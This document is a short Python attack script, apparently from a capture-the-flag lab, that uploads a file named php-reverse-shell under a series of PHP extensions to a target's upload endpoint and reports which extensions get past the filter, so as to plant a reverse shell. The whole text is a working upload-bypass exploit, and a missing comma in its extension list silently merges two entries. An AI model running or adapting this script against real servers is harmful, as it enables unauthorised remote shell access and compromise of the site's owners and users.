from requests import post
from os import rename

ip = "<MACHINE_IP>"
url = f"http://{ip}:3333/internal/index.php"
old_filename = "php-reverse-shell.php"
filename = "php-reverse-shell"
extentions = [
	".php",
	".php3",
	".php4"
	".php5",
	".phtml"
]

for extention in extentions:
	new_filename = filename + extention
	rename(old_filename, new_filename)
	with open(new_filename, "rb") as file:
		files = {"file": file}
		request = post(url, files = files)
		if "Extension not allowed" in request.text:
			print(f"{extention} not allowed")
		else:
			print(f"{extention} is allowed")
	old_filename = new_filename